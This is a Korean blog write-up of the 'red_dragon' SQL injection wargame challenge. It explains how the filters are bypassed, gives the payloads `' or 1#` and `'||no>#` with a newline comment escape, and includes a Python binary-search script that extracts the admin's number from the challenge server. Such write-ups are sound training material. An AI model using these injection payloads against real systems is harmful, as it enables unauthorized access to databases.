---
layout: single
title: "[Lord of SQLInjection] red_dragon write-up"
date: 2025-05-04 17:30 +0900
categories: 
    - WEB-write-up
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## Lord of SQLInjection (red_dragon)

### 풀이

id 파라미터가 필터링 되는 문자를 살펴보면, `prob _ .` 를 필터링하고 있고, 또한 7바이트보다 크면 `too long string` 문자열이 출력되면서 필터링된다. 다음 no 파라미터에서는 `is_numeric` 함수를 이용해서 숫자가 맞는지 비교하고 참이면 no 파라미터 값을 그대로 가서 쿼리에 넣고 아니면 1을 넣는다. 쿼리 결과의 id값이 있다면 echo로 출력해주고, admin 계정의 no 값과 파라미터의 no 값이 일치해야 solve가 된다.

![image-20250504173332194](/images/2025-05-04-los-red_dragon/image-20250504173332194.png)

<br>

`' or 1#` 을 id 파라미터에 넣고 요청해보면 result 결과 값이 admin이 나온다. guest 값도 테스트해보면 echo로 출력되지 않는 걸로 봐서 prob_red_dragon 테이블에 admin 데이터밖에 존재하지 않는 것을 알 수 있다.

![image-20250504180700118](/images/2025-05-04-los-red_dragon/image-20250504180700118.png)

![image-20250504180843159](/images/2025-05-04-los-red_dragon/image-20250504180843159.png)

<br>

일단 `is_numeric` 함수의 우회 방법에 대해서 찾아보자. 검색을 해보면 hex값, 소수점, 지수 등을 이용해서 우회가 가능하다고 한다. 근데 이 방법으로 문자열까지 우회할 수는 없기 때문에 id 파라미터 부분에서 아래와 같이 `'||no>#` 을 입력해주면 뒤에 no 파라미터에서 줄바꿈 문자로 주석을 탈출하고 123과 no 값을 비교할 수 있다.

<br>

![image-20250504185109069](/images/2025-05-04-los-red_dragon/image-20250504185109069.png)

<br>

123보다는 크고 엄청 큰 값을 입력해주면 출력되지 hello admin이 출력되지 않는 것을 알 수 있다. 이제 이를 이진 탐색 트리를 이용해서 파이썬 코드를 짜보자.

![image-20250504185309894](/images/2025-05-04-los-red_dragon/image-20250504185309894.png)

<br>

아래처럼 기존 reqeusts로 전송할 때 처럼 코드를 짜면 자동 url 인코딩 돼서 7바이트가 넘어간다. 따라서 아래처럼 url을 수동으로 요청되는 부분을 만들어주고 이진 탐색 트리를 이용해서 짜주면 되겠다.

```python
import requests

url_base = 'https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php'
cookie = {"PHPSESSID": "d5fo2u0cj07ikqrk2qftquavbd"}

start = 500000000
end = 600000000

while start < end:
    mid = (start + end) // 2
    print(f"start: {start}, end: {end}, mid: {mid}")

    crafted_url = f"{url_base}?id='||no>%23&no=%0a{mid}"

    r = requests.get(crafted_url, cookies=cookie)
    #print(crafted_url)
    if "Hello admin" in r.text:
        start = mid + 1
    else:
        end = mid

print(f"[+] admin의 no 값은 {start}")
```

![image-20250504193508845](/images/2025-05-04-los-red_dragon/image-20250504193508845.png)
